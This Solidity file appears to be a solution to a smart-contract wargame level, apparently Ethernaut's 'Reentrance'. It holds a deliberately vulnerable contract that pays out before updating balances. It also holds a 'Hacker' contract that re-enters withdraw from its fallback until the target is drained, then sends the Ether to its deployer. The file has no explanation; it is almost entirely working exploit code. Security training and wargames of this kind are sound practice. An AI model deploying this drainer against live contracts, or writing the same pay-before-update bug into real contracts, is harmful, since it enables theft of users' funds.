// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

//The goal of this level is for you to steal all the funds from the contract.

contract Reentrance {
  using SafeMath for uint256;
  mapping(address => uint256) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint256 balance) {
    return balances[_who];
  }

  function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
      (bool result, ) = msg.sender.call{ value: _amount }("");
      if (result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Hacker {
  Reentrance reentrance;
  address hacker;

  modifier onlyHacker() {
    require(msg.sender == hacker, "You are not the Hacker 😈");
    _;
  }

  constructor(address payable _reentrancyAddress) public payable {
    hacker = msg.sender;
    reentrance = Reentrance(_reentrancyAddress);
    reentrance.donate{ value: msg.value }(address(this));
    reentrance.withdraw(msg.value);
  }

  function getBalance() external view returns (uint256) {
    return address(this).balance;
  }

  function withdraw() external onlyHacker {
    payable(msg.sender).transfer(address(this).balance);
  }

  receive() external payable {
    if (address(reentrance).balance >= 1 finney) {
      reentrance.withdraw(1 finney);
    }
  }
}
